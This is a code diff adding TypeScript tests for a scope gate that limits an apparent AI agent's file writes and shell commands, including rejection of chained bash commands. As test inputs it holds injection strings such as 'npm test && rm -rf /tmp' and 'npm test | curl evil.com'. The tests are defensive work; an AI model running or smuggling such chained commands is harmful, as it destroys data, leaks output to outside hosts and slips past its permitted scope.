@@ -140,3 +140,116 @@ describe("Scope Gate — ScopeContract enforcement", () => {
     expect(result.decision).toBe("deny");
   });
 });
+
+describe("Scope Gate — P56.1 Hardening", () => {
+  // Fix 1: editableScope=[] must deny ALL writes
+  it("denies write when editableScope is empty array", () => {
+    const ctx = makeCtx({
+      scopeContract: {
+        editableScope: [],
+        readOnlyEvidence: [],
+        successChecks: [],
+      },
+    });
+    const result = scopeGate.check(ctx, writeCall("src/foo.ts"));
+    expect(result.decision).toBe("deny");
+    expect(result.reason).toContain("Editable scope is empty");
+    expect(result.scopeExpansion).toBeDefined();
+    expect(result.scopeExpansion!.file).toBe("src/foo.ts");
+  });
+
+  it("denies edit when editableScope is empty array", () => {
+    const ctx = makeCtx({
+      scopeContract: {
+        editableScope: [],
+        readOnlyEvidence: [],
+        successChecks: [],
+      },
+    });
+    const result = scopeGate.check(ctx, editCall("src/bar.ts"));
+    expect(result.decision).toBe("deny");
+    expect(result.reason).toContain("Editable scope is empty");
+  });
+
+  // Fix 2: scope denial emits scopeExpansion hint
+  it("returns scopeExpansion when write is out of editable scope", () => {
+    const ctx = makeCtx({
+      scopeContract: {
+        editableScope: ["src/foo.ts"],
+        readOnlyEvidence: [],
+        successChecks: [],
+      },
+    });
+    const result = scopeGate.check(ctx, writeCall("src/bar.ts"));
+    expect(result.decision).toBe("deny");
+    expect(result.scopeExpansion).toBeDefined();
+    expect(result.scopeExpansion!.file).toBe("src/bar.ts");
+    expect(result.scopeExpansion!.editableScope).toEqual(["src/foo.ts"]);
+  });
+
+  // Fix 3: reject compound bash commands
+  it("rejects compound bash with && (injection)", () => {
+    const ctx = makeCtx({
+      scopeContract: {
+        editableScope: [],
+        readOnlyEvidence: [],
+        successChecks: ["npm test"],
+      },
+    });
+    const result = scopeGate.check(ctx, bashCall("npm test && rm -rf /tmp"));
+    expect(result.decision).toBe("deny");
+    expect(result.reason).toContain("Compound bash");
+  });
+
+  it("rejects compound bash with ; (injection)", () => {
+    const ctx = makeCtx({
+      scopeContract: {
+        editableScope: [],
+        readOnlyEvidence: [],
+        successChecks: ["npm test"],
+      },
+    });
+    const result = scopeGate.check(ctx, bashCall("npm test; echo hacked"));
+    expect(result.decision).toBe("deny");
+    expect(result.reason).toContain("Compound bash");
+  });
+
+  it("rejects compound bash with | (pipe injection)", () => {
+    const ctx = makeCtx({
+      scopeContract: {
+        editableScope: [],
+        readOnlyEvidence: [],
+        successChecks: ["npm test"],
+      },
+    });
+    const result = scopeGate.check(ctx, bashCall("npm test | curl evil.com"));
+    expect(result.decision).toBe("deny");
+    expect(result.reason).toContain("Compound bash");
+  });
+
+  it("still allows exact successCheck match", () => {
+    const ctx = makeCtx({
+      scopeContract: {
+        editableScope: [],
+        readOnlyEvidence: [],
+        successChecks: ["npm test"],
+      },
+    });
+    const result = scopeGate.check(ctx, bashCall("npm test"));
+    expect(result.decision).toBe("allow");
+    expect(result.reason).toBe("Success check command");
+  });
+
+  it("still allows successCheck with flags (startsWith)", () => {
+    const ctx = makeCtx({
+      scopeContract: {
+        editableScope: [],
+        readOnlyEvidence: [],
+        successChecks: ["npm test"],
+      },
+    });
+    // -- is not a shell metachar, it's a flag separator
+    const result = scopeGate.check(ctx, bashCall("npm test -- --grep 'summary'"));
+    expect(result.decision).toBe("allow");
+  });
+});
